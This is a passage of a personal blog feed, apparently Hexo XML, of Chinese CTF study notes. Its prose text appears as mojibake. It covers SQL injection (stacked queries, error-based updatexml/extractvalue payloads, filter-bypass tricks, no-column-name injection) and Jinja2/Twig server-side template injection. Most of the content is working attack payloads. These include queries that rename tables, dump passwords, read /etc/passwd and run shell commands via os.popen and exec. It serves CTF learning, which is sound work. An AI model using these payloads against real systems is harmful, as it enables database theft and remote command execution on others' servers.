<p><a href="https://blog.csdn.net/qq_45655564/article/details/117395152">(41æ¡æ¶ˆæ¯) å‘½ä»¤æ³¨å…¥â€”â€”â€”â€”ctfhubï¼ˆè¿‡æ»¤catã€ç©ºæ ¼ã€ç›®å½•åˆ†éš”ç¬¦ã€è¿ç®—ç¬¦ã€ç»¼åˆè¿‡æ»¤ç»ƒä¹ ï¼‰_å°Lowå¨ƒçš„åšå®¢-CSDNåšå®¢_ctfhub å‘½ä»¤æ³¨å…¥ ç»¼åˆè¿‡æ»¤</a></p>
]]></content>
      <categories>
        <category>ping</category>
      </categories>
      <tags>
        <tag>ping</tag>
      </tags>
  </entry>
  <entry>
    <title>sql</title>
    <url>/2021/12/26/sql/</url>
    <content><![CDATA[<h1 id="æ”»é˜²ä¸–ç•Œ-supersqli"><a href="#æ”»é˜²ä¸–ç•Œ-supersqli" class="headerlink" title="æ”»é˜²ä¸–ç•Œ-supersqli"></a>æ”»é˜²ä¸–ç•Œ-supersqli</h1><p>æ‰“å¼€æ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†å¥½å¤šä¸œè¥¿ /select|update|delete|drop|insrt|where|./i</p>
<p>ç½‘ä¸Šæœäº†æœå¼€å§‹å°è¯•ç€ç»•è¿‡ï¼Œä½†æ˜¯å°è¯•äº†å¥½å‡ ç§ç»•è¿‡æ–¹æ³•éƒ½ä¸è¡Œï¼Œçœ‹äº†ä¸€ä¸‹wpï¼ŒçŸ¥é“æ˜¯è¦é‡‡ç”¨å †å æ³¨å…¥ï¼Œç¬¬ä¸€æ¬¡çŸ¥é“ï¼Œç½‘ä¸Šå¼€æœã€‚</p>
<p>1.æŸ¥æ•°æ®åº“</p>
<p>-1â€™;show databases;#</p>
<p>ä½†æ˜¯ä¸æ˜ç™½ï¼Œæ„Ÿè§‰æŸ¥è¿™ä¸ªåº“æ²¡å•¥å­ä½œç”¨</p>
<p>2.æŸ¥è¡¨</p>
<p>-1â€™;show tables;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å‡ºç°äº†ä¸¤ä¸ªè¡¨å•ï¼Œéƒ½æŸ¥è¯¢çœ‹ä¸€ä¸‹å˜›</p>
<p>3.æŸ¥åˆ—è¡¨</p>
<p>ï¼ˆ1ï¼‰-1â€˜;show columns from <code>1919810931114514</code>;#</p>
<p>â€‹    å­—ç¬¦ä¸²ä¸ºè¡¨åæ—¶è¿›è¡Œæ“ä½œæ—¶è¦åŠ åå¼•å·``è¿™ä¸¤ä¸ªæ ‡è®°ç¬¦å·ï¼Œå¼„äº†æˆ‘å¥½é•¿æ—¶é—´ï¼Œæ²¡æ³¨æ„åˆ°åå¼•å·è¿™ç©æ„ï¼Œé”™æŠŠå•å¼•å·å½“åå¼•å·</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">    flag ,NOå­—æ®µ</p>
<p>ï¼ˆ2ï¼‰-1â€™;show columns from <code>words</code>;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>id,NOç­‰å­—æ®µ</p>
<p>å› ä¸ºè¿™é‡Œæ˜¯å­—æ®µï¼Œè€Œä¸æ˜¯åˆ—åï¼Œä¸èƒ½ç›´æ¥è¿›è¡ŒæŸ¥è¯¢ã€‚è€Œä¸”é€šè¿‡è§‚å¯Ÿint()å‘ç°ï¼Œå†™å…¥åˆ°çš„å†…å®¹å­˜åˆ°äº†idä¸­ï¼Œæ¨æµ‹æŸ¥è¯¢çš„æ˜¯wordsè¡¨ä¸­çš„å†…å®¹ï¼Œå³è¾“å…¥çš„å†…å®¹éƒ½ä¼šåœ¨wordsè¿™ä¸ªè¡¨ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œä½†æ˜¯flagä¸åœ¨è¿™ä¸ªè¡¨ä¸­</p>
<p>4.<strong>æŸ¥è¯¢å­—æ®µå†…å®¹</strong></p>
<p>æœ‰ä¸¤ç§æ–¹æ³•</p>
<p>1.æ”¹è¡¨å</p>
<p>æ ¹æ®åœ¨wordsè¡¨é‡Œå‘ç°idå­—æ®µä¸æŸ¥è¯¢æ¡†é‡Œçš„å‡ºçš„æ•°æ®ç±»å‹ç›¸åŒï¼Œä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥çŒœæµ‹é»˜è®¤æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨ï¼Œinjectï¼ˆæœç´¢æ¡†ä¸­ï¼‰å€¼åº”è¯¥èµ‹ç»™äº†id<br>åˆ©ç”¨ï¼šæˆ‘ä»¬å¯ä»¥å°†å«æœ‰flagå­—æ®µçš„è¡¨å‘½åä¸ºwordï¼Œç„¶åä¿®æ”¹å­—æ®µåå­—ï¼Œä¸å°±æŸ¥è¯¢åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼ï¼ˆå‰ææ˜¯è¿™é‡Œrenameï¼Œalertå…³é”®å­— æ²¡æœ‰åšè¿‡æ»¤ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹flag</p>
<p>1â€™ or 1=1#</p>
<p>2.é¢„ç¼–è¯‘æ¥ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€˜;sEt @sql = CONCAT(â€˜seâ€™,â€˜lect * from <code>1919810931114514</code>;â€™); è¿›è¡Œé¢„ç¼–è¯‘<br>prEpare stmt from @sql; è®¾ç½®å˜é‡<br>EXECUTE stmt;# æ‰§è¡Œ</p>
<p>å¯¹é¢„ç¼–è¯‘ä¸æ˜¯å¾ˆäº†è§£ï¼Œäº†è§£ä¹‹åå†åšè¡¥å……å§ï¼ï¼</p>
<p>æœ€åï¼Œä¸æ„§æ˜¯å¼ºç½‘æ¯çš„é¢˜ï¼ŒçœŸæ˜¯éš¾å‘€</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">(40æ¡æ¶ˆæ¯) æ”»é˜²ä¸–ç•Œ-supersqliè¯¦è§£_Mr_hellowordçš„åšå®¢-CSDNåšå®¢</a></p>
<h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çˆ†æ•°æ®åº“?username=admin&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))or&#x27;1&amp;password=1â€‹</span><br><span class="line"></span><br><span class="line">æŠ¥è¡¨å?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â€‹çˆ†åˆ—å?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))or&#x27;1&amp;password=1â€‹</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å¯†ç ?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1â€‹â€‹</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŸ¥æ•°æ®åº“åï¼šid=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">çˆ†è¡¨åï¼šid=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">çˆ†å­—æ®µåï¼šid=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">çˆ†æ•°æ®ï¼šid=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çˆ†æ•°æ®åº“åï¼š&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">çˆ†è¡¨åï¼š&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">çˆ†åˆ—åï¼š&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">çˆ†æ•°æ®ï¼š&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çˆ†æ•°æ®åº“åï¼š&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">çˆ†è¡¨åï¼š&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">çˆ†åˆ—åï¼š&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">çˆ†æ•°æ®ï¼š&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://blog.csdn.net/silence1_/article/details/90812612">(43æ¡æ¶ˆæ¯) sqlæ³¨å…¥ä¹‹æŠ¥é”™æ³¨å…¥_silence1_çš„åšå®¢-CSDNåšå®¢_æŠ¥é”™æ³¨å…¥</a></p>
<h1 id="sqlæ³¨å…¥ç»•è¿‡å¤§å…¨"><a href="#sqlæ³¨å…¥ç»•è¿‡å¤§å…¨" class="headerlink" title="sqlæ³¨å…¥ç»•è¿‡å¤§å…¨"></a>sqlæ³¨å…¥ç»•è¿‡å¤§å…¨</h1><p><strong>åŸºæœ¬ç»•è¿‡æ–¹æ³•</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å¤§å°å†™</span><br><span class="line">2.åŒå†™</span><br><span class="line">3.ç¼–ç ï¼Œå¦‚URLEncodeç¼–ç ï¼ŒASCIIç¼–ç ç»•è¿‡</span><br><span class="line">4.å†…æ•›æ³¨é‡Š</span><br></pre></td></tr></table></figure>

<p><strong>ç©ºæ ¼ç»•è¿‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.ç”¨æ³¨é‡Šæ›¿æ¢ç©ºæ ¼</span><br><span class="line">select/**/user,password/**/from /**/users;</span><br><span class="line">2.ç©ºæ ¼urlç¼–ç %20</span><br><span class="line">3.ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼</span><br><span class="line">4.ç”¨Tabä»£æ›¿ç©ºæ ¼</span><br><span class="line">5.%a0=ç©ºæ ¼</span><br><span class="line">6.å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Œæ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨æ‹¬å·ç»•è¿‡</span><br><span class="line">select(user())from dual where(1=1)and(2=2)</span><br><span class="line">7.å›è½¦</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>å¼•å·ç»•è¿‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.ä½¿ç”¨åå…­è¿›åˆ¶</span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">å¦‚å¼•å·è¢«è¿‡æ»¤ï¼Œå°±å¯ä»¥å°è¯•ä½¿ç”¨åå…­è¿›åˆ¶æ¥è¿›è¡Œç»•è¿‡</span><br><span class="line">å³å¯ä»¥å°†è¯­å¥å†™ä¸ºï¼š</span><br><span class="line">select column_name from information_schema.columns where table_name=0x7573657273;</span><br><span class="line"></span><br><span class="line">2.è¿˜æœ‰ä¸€ä¸ªåŠæ³•ï¼ˆå‰ææ˜¯å·²ç»å¾—çŸ¥æ•°æ®åº“åç§°å’Œè¡¨åï¼Œä¾‹å¦‚dvwaå’Œusersï¼‰ï¼š</span><br><span class="line">select column_name from information_schema.columns where table_schema=database();</span><br><span class="line">æŸ¥è¯¢æ‰€åœ¨æ•°æ®åº“ä¸­çš„æ‰€æœ‰åˆ—å,ç„¶å</span><br><span class="line">å¯ä»¥çŒœæˆ–è€…å°è¯•å¾—çŸ¥å“ªäº›å­—æ®µåœ¨å“ªä¸ªè¡¨ä¸­ï¼Œç„¶åï¼š</span><br><span class="line">select username,password from users;</span><br><span class="line"></span><br><span class="line">3.å®½å­—èŠ‚æ³¨å…¥</span><br></pre></td></tr></table></figure>

<p><strong>é€—å·ç»•è¿‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åˆ°substr(),mid(),limit,è¿™äº›å­å¥æ–¹æ³•éƒ½éœ€è¦ä½¿ç”¨åˆ°é€—å·</span><br><span class="line"></span><br><span class="line">å¯¹äºsubstr()å’Œmid()è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨fromçš„æ–¹å¼æ¥è§£å†³ï¼š</span><br><span class="line">select substr(database() from 1 for 1);</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨join</span><br><span class="line">union select 1,2 å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å¥å­ä»£æ›¿</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨like</span><br><span class="line">select ascii(mid(user(),1,1))=80 å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å¥å­ä»£æ›¿</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br><span class="line"></span><br><span class="line">limitä¸­ï¼Œä½¿ç”¨offsetç»•è¿‡</span><br><span class="line">limit 1offset0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>or and xor not ç»•è¿‡</strong>**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ©ç”¨ç¬¦å·æ›¿æ¢and = &amp;&amp; or=|| xor=| not=!</span><br><span class="line">åœ¨æ•æ„Ÿè¯ä¸­æ·»åŠ æ³¨é‡Šï¼šan/**/d</span><br><span class="line">åŒå†™ç»•è¿‡oorr</span><br><span class="line">å¤§å°å†™å˜å½¢</span><br><span class="line">ç¼–ç </span><br></pre></td></tr></table></figure>

<p><strong>æ³¨é‡Šç¬¦ç»•è¿‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3 or &#x27;1&#x27;=&#x27;1 å³è™½ç„¶æ— æ³•ä½¿ç”¨æ³¨é‡Šç¬¦ï¼Œä½†æ˜¯å¯ä»¥é—­åˆæ‰ä»–</span><br><span class="line">æˆ–è€…ï¼šid=1&#x27; union select 1,2,&#x27;3</span><br><span class="line">æœ€åæ·»åŠ or 1&#x27;</span><br><span class="line">æœ€åæ·»åŠ  and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ç­‰å·ç»•è¿‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨like</span><br><span class="line">ä½¿ç”¨!&lt;&gt;,å› ä¸º&lt;&gt;æ˜¯ä¸ç­‰äº</span><br><span class="line">regrep (æ­£åˆ™è¡¨è¾¾åŒ¹é…)</span><br></pre></td></tr></table></figure>

<p>&lt;&gt;<strong>è¢«è¿‡æ»¤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">greatest(),least()</span><br><span class="line">strcmp(str1,str2),ç¬¬ä¸€ä¸ªå‚æ•°å°äºç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿”å›-1ï¼Œå¦åˆ™ä¸º1</span><br><span class="line">inï¼Œbetween a and b</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_44940180/article/details/107717511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&utm_relevant_index=1">(43æ¡æ¶ˆæ¯) SQLæ³¨å…¥â€“ç»•è¿‡æŠ€å·§_é›ªç¢§å¯ä¹_çš„åšå®¢-CSDNåšå®¢_sqlæ³¨å…¥ç»•è¿‡</a></p>
<p><a href="https://blog.csdn.net/fastergohome/article/details/102514160">(44æ¡æ¶ˆæ¯) CTF ä¸­çš„ SQL æ³¨å…¥æ€»ç»“_é‡æ–°å¯ç¨‹-CSDNåšå®¢</a></p>
<h1 id="æ— åˆ—åæŸ¥è¯¢"><a href="#æ— åˆ—åæŸ¥è¯¢" class="headerlink" title="æ— åˆ—åæŸ¥è¯¢"></a>æ— åˆ—åæŸ¥è¯¢</h1><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>åˆšå¼€å§‹æ³¨å…¥çš„æ—¶å€™å‘ç°ç©ºæ ¼ï¼Œæ³¨é‡Šç¬¦è¢«è¿‡æ»¤ã€‚åœ¨æŸ¥è¯¢è¡¨åçš„æ—¶å€™ï¼Œå‘ç°è€æ˜¯å‡ºç°é”™è¯¯ï¼Œè¦æƒ³åˆ°æ˜¯ä»€ä¹ˆè¢«è¿‡æ»¤äº†ã€‚çœ‹å®ŒwpåçŸ¥é“æ˜¯information_schema.tablesè¢«è¿‡æ»¤äº†ã€‚</p>
<h2 id="mysql-innodb-table-stats"><a href="#mysql-innodb-table-stats" class="headerlink" title="mysql.innodb_table_stats"></a>mysql.innodb_table_stats</h2><p>å½“ â€œorâ€ è¢«è¿‡æ»¤äº†å¯¼è‡´information_schemaä¸èƒ½ç”¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<strong>mysql.innodb_table_stats</strong>è¿™ä¸ªè¡¨æ¥è·å–åº“åã€è¡¨å</p>
<h2 id="sys-schema-table-statistics"><a href="#sys-schema-table-statistics" class="headerlink" title="sys.schema_table_statistics"></a>sys.schema_table_statistics</h2><p>æ˜¾ç„¶ï¼Œå½“ â€œinâ€ è¢«è¿‡æ»¤æ—¶ï¼Œinformation_schema å’Œ mysql.innodb_table_stats åŒæ—¶ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚è¿™æ—¶å¯ä»¥ç”¨<strong>sys.schema_table_statistics</strong>æ¥è·å–åº“åã€è¡¨å</p>
<h2 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h2><p><a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysqlä¹‹æ— åˆ—åæ³¨å…¥ - çŸ¥ä¹ (zhihu.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line">æŸ¥è¯¢è¡¨å</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line">æŸ¥è¯¢è¡¨çš„å†…å®¹</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒæ–‡ç« ï¼š[<a href="https://www.cnblogs.com/AikN/p/15725756.html">SWPU2019]Web1 - AikNr - åšå®¢å›­ (cnblogs.com)</a></p>
<h1 id="å¥½æ–‡ç« "><a href="#å¥½æ–‡ç« " class="headerlink" title="å¥½æ–‡ç« "></a>å¥½æ–‡ç« </h1><p><a href="https://www.anquanke.com/post/id/160584#h2-12">CTFä¸­å‡ ç§é€šç”¨çš„sqlç›²æ³¨æ‰‹æ³•å’Œæ³¨å…¥çš„ä¸€äº›tips - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2021/12/14/ssti/</url>
    <content><![CDATA[<h1 id="SSTI-æ¨¡æ¿æ³¨å…¥æ¼æ´"><a href="#SSTI-æ¨¡æ¿æ³¨å…¥æ¼æ´" class="headerlink" title="SSTI æ¨¡æ¿æ³¨å…¥æ¼æ´"></a>SSTI æ¨¡æ¿æ³¨å…¥æ¼æ´</h1><p>æ–‡ä»¶åŒ…å«ï¼šæ˜¯é€šè¿‡pythonçš„å¯¹è±¡çš„ç»§æ‰¿æ¥ä¸€æ­¥æ­¥å®ç°æ–‡ä»¶è¯»å–å’Œå‘½ä»¤æ‰§è¡Œçš„çš„ã€‚<br>æ€è·¯ï¼šæ‰¾åˆ°çˆ¶ç±»&lt;type â€˜objectâ€™&gt;â€“&gt;å¯»æ‰¾å­ç±»â€“&gt;æ‰¾å…³äºå‘½ä»¤æ‰§è¡Œæˆ–è€…æ–‡ä»¶æ“ä½œçš„æ¨¡å—ã€‚</p>
<p>1.è·å–åŸºç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">request.__class__.__mro__[8] ã€€ã€€//é’ˆå¯¹jinjia2/flaskä¸º[9]é€‚ç”¨</span><br><span class="line">æˆ–è€…</span><br><span class="line">[].__class__.__bases__[0]       //å…¶ä»–çš„ç±»ä¼¼</span><br></pre></td></tr></table></figure>

<p>2.è·å–æœ¬ç±»çš„å­ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>

<p>3.æ‰¾åˆ°å¯åˆ©ç”¨çš„æ–¹æ³•</p>
<p>&lt;type â€˜fileâ€™&gt;ç­‰    &lt;class â€˜site._Printerâ€™&gt;ç±»å‹ï¼ˆå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°ç›®æ ‡æ–‡ä»¶ï¼Œæ¥ç€è¯»å–æ–‡ä»¶</p>
<p>4.è¯»å†™æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ‰å››ç§æ–¹æ³•ï¼Œå…·ä½“è¯¦æƒ…å‚è€ƒç¬¬äºŒç¯‡æ–‡ç« </p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://www.cnblogs.com/cioi/p/12308518.html#a5">ä»é›¶å¼€å§‹çš„sstiå­¦ä¹ ï¼ˆå·²å¡«ï¼‰ - Cxlover - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121569766">(40æ¡æ¶ˆæ¯) XCTF-æ”»é˜²ä¸–ç•ŒCTFå¹³å°-Webç±»â€”â€”12ã€Web_python_template_injectionï¼ˆSSTIæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥ã€Flaskæ¡†æ¶ä¹‹Jinja2æ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼‰_Onlyone_1314çš„åšå®¢-CSDNåšå®¢</a></p>
<h1 id="Simple-SSTI-2-bugku"><a href="#Simple-SSTI-2-bugku" class="headerlink" title="Simple_SSTI_2  bugku"></a>Simple_SSTI_2  bugku</h1><p>ç¬¬äºŒæ¬¡åšè¿™ç§é¢˜ï¼Œæ„Ÿè§‰è¿˜æ˜¯ä¸ä¼šåšï¼Œè·Ÿç€wpåšçš„</p>
<p>1.æŸ¥çœ‹ä¸Šä¸€çº§æ‰€å­˜åœ¨çš„æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls ../&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>2.æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­æœ‰å“ªäº›æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls /app&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>3.æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰äº›ä¸ç†è§£ï¼Œå…ˆå½“ä½œå¸¸ç”¨å‘½ä»¤è®°ç€å§ï¼ï¼</p>
<h1 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h1><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1231&#123;&#123;2*4&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­æ˜¯ä¸æ˜¯ssti</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=&#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä¸èƒ½æˆåŠŸï¼Œï¼Œå¥½åƒæ˜¯ç©ºæ ¼ä¸å¯ä»¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯æœ€åçš„payload</p>
<p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
<p>bypass</p>
<p>æ”»é˜²ä¸–ç•Œçš„é¢˜Web_python_template_injection</p>
